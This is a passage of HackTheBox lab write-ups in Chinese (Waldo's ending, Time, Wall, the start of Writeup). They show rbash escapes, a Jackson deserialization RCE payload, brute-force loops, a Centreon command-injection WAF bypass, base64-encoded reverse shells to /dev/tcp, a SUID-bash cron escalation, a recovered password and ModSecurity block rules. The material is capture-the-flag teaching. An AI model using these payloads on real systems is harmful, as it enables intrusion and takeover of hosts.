<h3 id="rbash逃逸"><a href="#rbash逃逸" class="headerlink" title="rbash逃逸"></a>rbash逃逸</h3><p>在rbash中，我们只能使用处于<code>PATH</code>变量中的程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">monitor@waldo:~$ echo $PATH</span><br><span class="line">&#x2F;home&#x2F;monitor&#x2F;bin:&#x2F;home&#x2F;monitor&#x2F;app-dev:&#x2F;home&#x2F;monitor&#x2F;app-dev&#x2F;v0.1</span><br></pre></td></tr></table></figure>

<p>尝试枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i in $(echo &#x2F;home&#x2F;monitor&#x2F;bin &#x2F;home&#x2F;monitor&#x2F;app-dev &#x2F;home&#x2F;monitor&#x2F;app-dev&#x2F;v0.1);do ls -la $i;done</span><br></pre></td></tr></table></figure>

<p><img src="/images/Waldo/15.png" alt="15"></p>
<h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p><code>red</code>(/bin/ed的软连接)在shell会话中和生成新的shell</p>
<p><img src="/images/Waldo/16.png" alt="16"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">monitor@waldo:~$ red</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br><span class="line">$ echo $0</span><br><span class="line">&#x2F;bin&#x2F;sh</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>这里没有cat,id,groups查看当前用户组的信息，但可以使用rnano(也就是nano)</p>
<p>发现monitor用户的GID为1001</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rnano &#x2F;etc&#x2F;passwd</span><br><span class="line">monitor:x:1001:1001:User for editing source and monitoring logs,,,:&#x2F;home&#x2F;monitor:&#x2F;bin&#x2F;rbash</span><br></pre></td></tr></table></figure>

<p>查看1001的组是谁，得到<code>monitor</code></p>
<p><img src="/images/Waldo/17.png" alt="17"></p>
<p>查看之前的<code>PATH</code>变量下的文件，发现<code>/home/monitor/app-dev/logMonitor</code>对于当前组具备WX权限</p>
<p><img src="/images/Waldo/18.png" alt="18"></p>
<p>用red(ed)命令覆盖<code>logMonitor</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">monitor@waldo:~$ red &#x2F;bin&#x2F;bash</span><br><span class="line">1099016</span><br><span class="line">w &#x2F;home&#x2F;monitor&#x2F;app-dev&#x2F;logMonitor</span><br><span class="line">1099016</span><br><span class="line">q</span><br></pre></td></tr></table></figure>

<p>之后在PATh变量中的形式执行<code>logMonitor</code>(rbash中不要使用相对路径)</p>
<p>虽然有些地方有点奇怪，但是我们确实获得了bash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">monitor@waldo:~$ logMonitor</span><br><span class="line">tmp.yGrnFH25Nw: dircolors: command not found</span><br><span class="line">monitor@waldo:~$ echo $0</span><br><span class="line">&#x2F;tmp&#x2F;tmp.yGrnFH25Nw</span><br><span class="line">monitor@waldo:~$ cd &#x2F;bin</span><br><span class="line">monitor@waldo:&#x2F;bin$</span><br></pre></td></tr></table></figure>

<h4 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h4><p>参考<a href="https://xz.aliyun.com/t/7642">文章</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">waldo:~$ ssh -i &#x2F;home&#x2F;nobody&#x2F;.ssh&#x2F;.monitor monitor@127.0.0.1 -t bash</span><br><span class="line">monitor@waldo:~$ echo $0</span><br><span class="line">bash</span><br></pre></td></tr></table></figure>

<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>修复PATH</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br></pre></td></tr></table></figure>

<p>枚举capabilities</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">monitor@waldo:~$ getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;tac &#x3D; cap_dac_read_search+ei</span><br><span class="line">&#x2F;home&#x2F;monitor&#x2F;app-dev&#x2F;v0.1&#x2F;logMonitor-0.1 &#x3D; cap_dac_read_search+ei</span><br></pre></td></tr></table></figure>

<p>linpeas也会突出表示</p>
<p><img src="/images/Waldo/20.png" alt="20"></p>
<p>查看capabilities</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">man capabilities</span><br></pre></td></tr></table></figure>

<p>发现<code>tac</code>程序具有<code>CAP_DAC_READ_SEARCH</code>，可以无视权限读取任意文件</p>
<p><img src="/images/Waldo/19.png" alt="19"></p>
<p>找到其用法</p>
<p><img src="/images/Waldo/21.png" alt="21"></p>
<p>验证</p>
<p><img src="/images/Waldo/22.png" alt="22"></p>
<p>这样就可以读取root.txt，但这台机器root用户的<code>.ssh</code>不存在<code>authorized_keys</code>，而且<code>shadow</code>无法破解，拿不到shell</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Time</title>
    <url>/2020/10/27/HTB-Time/</url>
    <content><![CDATA[<h1 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Time/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Time/2.png" alt="2"></p>
<p>页面随便输入一些信息，得到报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token &#39;test&#39;: was expecting &#39;null&#39;, &#39;true&#39;, &#39;false&#39; or NaN</span><br></pre></td></tr></table></figure>

<p>得到目标运行这jackson</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>google搜索，可以找到CVE-2019-12384</p>
<p>exploit:<a href="https://github.com/jas502n/CVE-2019-12384">https://github.com/jas502n/CVE-2019-12384</a><br>原理:<a href="http://blog.nsfocus.net/cve-2019-12384-2/">http://blog.nsfocus.net/cve-2019-12384-2/</a></p>
<p>看来只需要构造一个恶意的json包，就可以得到RCE，顺着文档来</p>
<p>现在本地开启http服务</p>
<p><img src="/images/Time/3.png" alt="3"></p>
<p>修改<code>inject.sql</code>的poc，比如ping</p>
<p><img src="/images/Time/4.png" alt="4"></p>
<p>原文payload是这个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jruby test.rb &quot;[\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&quot;, &#123;\&quot;url\&quot;:\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;localhost:8000&#x2F;inject.sql&#39;\&quot;&#125;]&quot;</span><br></pre></td></tr></table></figure>

<p>我们的输入点直接在Web页面上，所以除了修改刚刚开放的http地址和端口外，还要注意json的格式，删除前后引号，删掉转义，最后的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, &#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;10.10.16.98:8000&#x2F;inject.sql&#39;&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/images/Time/5.png" alt="5"></p>
<p>成功获得RCE，现在反弹shell即可</p>
<p><img src="/images/Time/6.png" alt="6"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>非常简单</p>
<p>发现可以写文件，文件名疑似计划任务</p>
<p><img src="/images/Time/7.png" alt="7"></p>
<p>确认计划任务及权限</p>
<p><img src="/images/Time/8.png" alt="8"></p>
<p>直接写入反弹shell</p>
<p><img src="/images/Time/9.png" alt="9"></p>
<p>获得root</p>
<p><img src="/images/Time/10.png" alt="10"></p>
<p>不过shell秒断，换个方法也是一回事</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;chmod 4777 &#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;usr&#x2F;bin&#x2F;timer_backup.sh</span><br><span class="line">&#x2F;bin&#x2F;bash -p</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Wall</title>
    <url>/2021/06/03/HTB-Wall/</url>
    <content><![CDATA[<h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><p><img src="/images/Wall/1.png" alt="1"></p>
<p>Web枚举</p>
<p><img src="/images/Wall/2.png" alt="2"></p>
<p><code>http://10.10.10.157/monitoring</code>需要验证</p>
<p><img src="/images/Wall/3.png" alt="3"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>没有太多可以枚举的东西，当前可以使用hydra对HTTP认证模式进行暴力破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l username.txt -P password.txt 10.10.10.157 http-get &#x2F;monitoring&#x2F;</span><br></pre></td></tr></table></figure>

<p>这里有点奇怪，对返回401的页面更改请求方式为POST，它会重定向到<code>/centreon</code>。也许是Apache的某种错误配置?</p>
<p><img src="/images/Wall/4.png" alt="4"></p>
<p>查看页面<code>/centreon</code></p>
<p><img src="/images/Wall/5.png" alt="5"></p>
<p>所以当前网站运行这<a href="https://github.com/centreon/centreon">centreon</a>，一个开源的网络监控平台，版本为19.04.0，我们可以直接搜索公开漏洞</p>
<p><img src="/images/Wall/6.png" alt="6"></p>
<p>发现RCE漏洞，不过该漏洞需要凭据。谷歌默认凭据得到<code>admin/centreon</code></p>
<p><img src="/images/Wall/7.png" alt="7"></p>
<p>不过这里没有生效</p>
<p><img src="/images/Wall/8.png" alt="8"></p>
<p>尝试了其他一些弱口令之后，实在没啥进展，所以我决定对其进行暴力破解，不过这里有<code>CSRF_TOKEN</code></p>
<p><img src="/images/Wall/9.png" alt="9"></p>
<h2 id="CSRF暴力破解"><a href="#CSRF暴力破解" class="headerlink" title="CSRF暴力破解"></a>CSRF暴力破解</h2><h3 id="BurpSuite-PitchFork"><a href="#BurpSuite-PitchFork" class="headerlink" title="BurpSuite PitchFork"></a>BurpSuite PitchFork</h3><p>在<code>HTB:Blunder</code>中，我使用BurpSuite Macro对CSRF_TOKEN，这次换一下，使用BurpSuite的<strong>PitchFork</strong>功能，它发送的payload总数为单个字典的的数目</p>
<table>
<thead>
<tr>
<th>username</th>
<th>password</th>
</tr>
</thead>
<tbody><tr>
<td>username1</td>
<td>password1</td>
</tr>
<tr>
<td>username2</td>
<td>password2</td>
</tr>
<tr>
<td>username3</td>
<td>password3</td>
</tr>
</tbody></table>
<p>我们可以使用<code>Grep - Extract</code>抓取token，然后配合密码进行发送</p>
<p><img src="/images/Wall/11.png" alt="11"></p>
<p>幸运，我们可以通过暴力破解得到正确的密码</p>
<p><img src="/images/Wall/12.png" alt="12"></p>
<p>使用凭据<code>admin/password1</code>，成功登陆</p>
<p><img src="/images/Wall/10.png" alt="10"></p>
<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>通过官方<a href="https://docs.centreon.com/docs/centreon/en/latest/api/api_rest/#authentication">文档</a>，Centreon有一个API可以接受认证，我们可以直接对API发起验证，比如通过工具<code>curl</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i in $(cat &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Passwords&#x2F;darkweb2017-top100.txt);do curl -s &#39;http:&#x2F;&#x2F;10.10.10.157&#x2F;centreon&#x2F;api&#x2F;index.php?action&#x3D;authenticate&#39; -d &quot;username&#x3D;admin&amp;password&#x3D;$i&quot;|grep -v Bad &amp;&amp; echo $i;done</span><br></pre></td></tr></table></figure>

<p><img src="/images/Wall/13.png" alt="13"></p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="CVE-2019-13024"><a href="#CVE-2019-13024" class="headerlink" title="CVE-2019-13024"></a>CVE-2019-13024</h3><p>发现漏洞编号<a href="https://www.exploit-db.com/exploits/47948">2019-13024</a>，这里我要手动利用它，找到了这篇<a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/">文章</a></p>
<p>首先选择<code>Configure pollers</code></p>
<p><img src="/images/Wall/14.png" alt="14"></p>
<p>选中对象<code>Central</code>进入配置界面，在<code>Monitoring Engine Binary</code>处插入payload</p>
<p><img src="/images/Wall/15.png" alt="15"></p>
<p>文章中说要自己手动构造一个POST请求</p>
<p><img src="/images/Wall/16.png" alt="16"></p>
<p>这个请求包可以在<code>Export configuration</code></p>
<p><img src="/images/Wall/17.png" alt="17"></p>
<p>选中对象<code>Central</code>，之后点击Export，即可回显</p>
<p><img src="/images/Wall/18.png" alt="18"></p>
<p>到这里，RCE就成功了，现在就差反弹shell了</p>
<h3 id="CVE-2019-16405"><a href="#CVE-2019-16405" class="headerlink" title="CVE-2019-16405"></a>CVE-2019-16405</h3><p>在Configuration→Commands→Miscellaneous点击Add</p>
<p><img src="/images/Wall/19.png" alt="19"></p>
<p>填写<code>Command Name</code>，<code>Command Line</code>输入要执行的指令，<code>Argument Example</code>输入目标机器，点击蓝色箭头，命令就会执行</p>
<p><img src="/images/Wall/20.png" alt="20"></p>
<h2 id="Bypass-WAF"><a href="#Bypass-WAF" class="headerlink" title="Bypass WAF"></a>Bypass WAF</h2><p>如果我们使用<code>CVE-2019-13024</code>，输入payload:<code>echo test</code></p>
<p><img src="/images/Wall/21.png" alt="21"></p>
<p>页面返回403</p>
<p><img src="/images/Wall/22.png" alt="22"></p>
<p>尝试使用<code>$&#123;IFS&#125;</code>，在Linux的命令注入里，这表示空格</p>
<p><img src="/images/Wall/23.png" alt="23"></p>
<p>可以发现，命令执行成功</p>
<p><img src="/images/Wall/24.png" alt="24"></p>
<p>或者尝试其他过滤方式，比如<code>&#123;ping,-c,1,10.10.16.12&#125;</code></p>
<p>这里看来是存在过滤，不过这里有一个地方很有意思，如果我们使用<code>CVE-2019-16405</code>，它又可以接收空格</p>
<p><img src="/images/Wall/25.png" alt="25"></p>
<p>这里一开始没明白怎么会是，只是感觉<code>CVE-2019-13024</code>不接收空格这个字符，后来弄明白了这里的原因(剧透:<code>CVE-2019-13024</code>的命令执行使用了POST请求，后端的WAF ModeSecurity会过滤POST请求的空格字符，而<code>CVE-2019-16405</code>的命令注入使用了GET请求，WAF不会对GET请求进行过滤)</p>
<h3 id="CVE-2019-13024绕过"><a href="#CVE-2019-13024绕过" class="headerlink" title="CVE-2019-13024绕过"></a>CVE-2019-13024绕过</h3><p>这里的绕过主要针对空格，我们可以尝试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> <span class="string">&quot;ping -c 1 10.10.16.12&quot;</span> |base64</span></span><br><span class="line">cGluZyAtYyAxIDEwLjEwLjE2LjEyCg==</span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> <span class="string">&quot;echo cGluZyAtYyAxIDEwLjEwLjE2LjEyCg== |base64 -d |bash&quot;</span> |sed <span class="string">&#x27;s/ /$&#123;IFS&#125;/g&#x27;</span></span></span><br><span class="line"><span class="meta">echo$</span><span class="bash">&#123;IFS&#125;cGluZyAtYyAxIDEwLjEwLjE2LjEyCg==<span class="variable">$&#123;IFS&#125;</span>|base64<span class="variable">$&#123;IFS&#125;</span>-d<span class="variable">$&#123;IFS&#125;</span>|bash</span></span><br></pre></td></tr></table></figure>

<p>所有payload就是<code>echo$&#123;IFS&#125;cGluZyAtYyAxIDEwLjEwLjE2LjEyCg==$&#123;IFS&#125;|base64$&#123;IFS&#125;-d$&#123;IFS&#125;|bash</code>，不过输入输入会报错，命令执行失败</p>
<p><img src="/images/Wall/26.png" alt="26"></p>
<p>尝试修改payload，一段时间后，发现需要在命令后面添加分号，也许是需要隔开后面的参数</p>
<p>payload:<code>echo$&#123;IFS&#125;cGluZyAtYyAxIDEwLjEwLjE2LjEyCg==$&#123;IFS&#125;|base64$&#123;IFS&#125;-d$&#123;IFS&#125;|bash;</code></p>
<p>这次命令执行成功</p>
<p><img src="/images/Wall/27.png" alt="27"></p>
<p>所以修改payload</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.12/4444 0&gt;&amp;1&#x27;&quot;</span> |base64</span></span><br><span class="line">YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMi80NDQ0IDA+JjEnCg==</span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> <span class="string">&quot;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMi80NDQ0IDA+JjEnCg== |base64 -d |bash&quot;</span> |sed <span class="string">&#x27;s/ /$&#123;IFS&#125;/g&#x27;</span></span></span><br><span class="line"><span class="meta">echo$</span><span class="bash">&#123;IFS&#125;YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMi80NDQ0IDA+JjEnCg==<span class="variable">$&#123;IFS&#125;</span>|base64<span class="variable">$&#123;IFS&#125;</span>-d<span class="variable">$&#123;IFS&#125;</span>|bash</span></span><br></pre></td></tr></table></figure>

<p>payload:<code>echo$&#123;IFS&#125;YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMi80NDQ0IDA+JjEnCg==$&#123;IFS&#125;|base64$&#123;IFS&#125;-d$&#123;IFS&#125;|bash;</code></p>
<p>成功获得shell</p>
<p><img src="/images/Wall/28.png" alt="28"></p>
<h3 id="CVE-2019-16405绕过"><a href="#CVE-2019-16405绕过" class="headerlink" title="CVE-2019-16405绕过"></a>CVE-2019-16405绕过</h3><p>尝试payload:<code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.12/4444 0&gt;&amp;1&#39;</code></p>
<p><img src="/images/Wall/29.png" alt="29"></p>
<p>得到很多转义，尝试base64编码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.12/4444 0&gt;&amp;1&#x27;&quot;</span> |base64</span></span><br><span class="line">YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMi80NDQ0IDA+JjEnCg==</span><br></pre></td></tr></table></figure>

<p>payload:<code>echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMi80NDQ0IDA+JjEnCg== |base64 -d |bash</code></p>
<p><img src="/images/Wall/30.png" alt="30"></p>
<p>这里更加明显了，直接过滤了管道<code>|</code>，目前看来，这里过滤特殊符号，但是不过滤空格</p>
<p>编写<code>shell</code>文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.12&#x2F;5555 0&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure>

<p>尝试执行命令，似乎成功下载了文件</p>
<p><img src="/images/Wall/31.png" alt="31"></p>
<p>之后顺序执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x &#x2F;tmp&#x2F;shell</span><br><span class="line">bash &#x2F;tmp&#x2F;shell</span><br></pre></td></tr></table></figure>

<p><img src="/images/Wall/32.png" alt="32"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>在<code>/opt</code>目录发现<code>.shelby/backup</code>文件，而且这是一个<code>pyc</code>文件</p>
<p><img src="/images/Wall/33.png" alt="33"></p>
<p>传输到kali上，使用<code>uncompyle6</code>反编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uncompyle6 backup.pyc </span><br><span class="line"># uncompyle6 version 3.7.4</span><br><span class="line"># Python bytecode 2.7 (62211)</span><br><span class="line"># Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) </span><br><span class="line"># [GCC 9.3.0]</span><br><span class="line"># Embedded file name: backup.py</span><br><span class="line"># Compiled at: 2019-07-30 22:38:22</span><br><span class="line">import paramiko</span><br><span class="line">username &#x3D; &#39;shelby&#39;</span><br><span class="line">host &#x3D; &#39;wall.htb&#39;</span><br><span class="line">port &#x3D; 22</span><br><span class="line">transport &#x3D; paramiko.Transport((host, port))</span><br><span class="line">password &#x3D; &#39;&#39;</span><br><span class="line">password +&#x3D; chr(ord(&#39;S&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;h&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;e&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;l&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;b&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;y&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;P&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;a&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;s&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;s&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;w&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;@&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;r&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;d&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;I&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;s&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;S&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;t&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;r&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;o&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;n&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;g&#39;))</span><br><span class="line">password +&#x3D; chr(ord(&#39;!&#39;))</span><br><span class="line">transport.connect(username&#x3D;username, password&#x3D;password)</span><br><span class="line">sftp_client &#x3D; paramiko.SFTPClient.from_transport(transport)</span><br><span class="line">sftp_client.put(&#39;&#x2F;var&#x2F;www&#x2F;html.zip&#39;, &#39;html.zip&#39;)</span><br><span class="line">print &#39;[+] Done !&#39;</span><br><span class="line"># okay decompiling backup.pyc</span><br></pre></td></tr></table></figure>

<p>存在password字段，将其打印出来</p>
<p><img src="/images/Wall/34.png" alt="34"></p>
<p>得到密码后就可以ssh了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh shelby@10.10.10.157</span><br><span class="line">ShelbyPassw@rdIsStrong!</span><br></pre></td></tr></table></figure>

<p><img src="/images/Wall/35.png" alt="35"></p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>枚举SUID发现<code>screen-4.5.0</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shelby@Wall:~$ find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;screen-4.5.0</span><br><span class="line">&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;vmware-tools&#x2F;bin32&#x2F;vmware-user-suid-wrapper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;vmware-tools&#x2F;bin64&#x2F;vmware-user-suid-wrapper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br></pre></td></tr></table></figure>

<p>提权参考<code>靶场Wintermute</code></p>
<p><img src="/images/Wall/36.png" alt="36"></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>之前我们请求<code>/monitoring</code>需要凭据，是因为<code>.htaccess</code>限制了GET请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Wall:&#x2F;var&#x2F;www&#x2F;html&#x2F;monitoring# ls -a</span><br><span class="line">.  ..  .htaccess  index.html</span><br><span class="line">root@Wall:&#x2F;var&#x2F;www&#x2F;html&#x2F;monitoring# cat .htaccess </span><br><span class="line">AuthUserFile &#x2F;etc&#x2F;.htpasswd</span><br><span class="line">AuthName &quot;Protected area by the admin&quot;</span><br><span class="line">AuthType Basic</span><br><span class="line">&lt;Limit GET&gt;</span><br><span class="line">require valid-user</span><br><span class="line">&lt;&#x2F;Limit&gt;</span><br></pre></td></tr></table></figure>

<p>在<code>/etc/apache2/mods-enabled</code>发现<code>security2.conf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;IfModule security2_module&gt;</span><br><span class="line">        SecDataDir &#x2F;var&#x2F;cache&#x2F;modsecurity</span><br><span class="line">        IncludeOptional &#x2F;etc&#x2F;modsecurity&#x2F;*.conf</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>

<p>追踪配置文件，找到了黑名单的配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Wall:&#x2F;etc&#x2F;modsecurity# cat modsecurity.conf</span><br><span class="line">SecRuleEngine On</span><br><span class="line">SecRequestBodyAccess On</span><br><span class="line"></span><br><span class="line"># block nc word</span><br><span class="line">SecRule REQUEST_BODY &quot;\bnc\b&quot; &quot;id:00001,deny,msg:&#39;blocked&#39;&quot;</span><br><span class="line"></span><br><span class="line"># block ncat word</span><br><span class="line">SecRule REQUEST_BODY &quot;\bncat\b&quot; &quot;id:00002,deny,msg:&#39;blocked&#39;&quot;</span><br><span class="line"></span><br><span class="line"># block passwd word</span><br><span class="line">SecRule REQUEST_BODY &quot;\bpasswd\b&quot; &quot;id:00003,deny,msg:&#39;blocked&#39;&quot;</span><br><span class="line"></span><br><span class="line"># block # char</span><br><span class="line">SecRule REQUEST_BODY &quot;%23&quot; &quot;id:00004,deny,msg:&#39;blocked&#39;&quot;</span><br><span class="line"></span><br><span class="line"># block any whitespace</span><br><span class="line">SecRule REQUEST_BODY &quot;\+&quot; &quot;id:00005,deny,msg:&#39;blocked&#39;&quot;</span><br><span class="line"></span><br><span class="line"># block hostname word</span><br><span class="line">SecRule REQUEST_BODY &quot;\bhostname\b&quot; &quot;id:00006,deny,msg:&#39;blocked&#39;&quot;</span><br></pre></td></tr></table></figure>

<p>它对请求体的<code>nc、ncat、passwd、#、+、hostname</code>参数进行过滤</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Writeup</title>
    <url>/2021/05/10/HTB-Writeup/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Writeup/1.png" alt="1"></p>
<p>nmap发现了robots.txt，提示了路径/writeup/</p>
<p>首先查看首页，提示不要触发太多的4XX的HTTP响应，这会导致触发DOS保护，所以这里就不要枚举目录了</p>
<p><img src="/images/Writeup/2.png" alt="2"></p>
<p>查看/writeup/</p>
<p><img src="/images/Writeup/3.png" alt="3"></p>
<p>在页面源代码处提示了CMS版本，使用whatweb也可以快速得到</p>
<p><img src="/images/Writeup/4.png" alt="4"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>EDB上寻找公开漏洞，显示了很多</p>
<p><img src="/images/Writeup/5.png" alt="5"></p>
<p>鉴于此，我们应该尽可能的定位它的版本。考虑到它是开源的，我们可以去官方上找找看目录结构:<a href="http://www.cmsmadesimple.org/downloads/cmsms">链接</a></p>
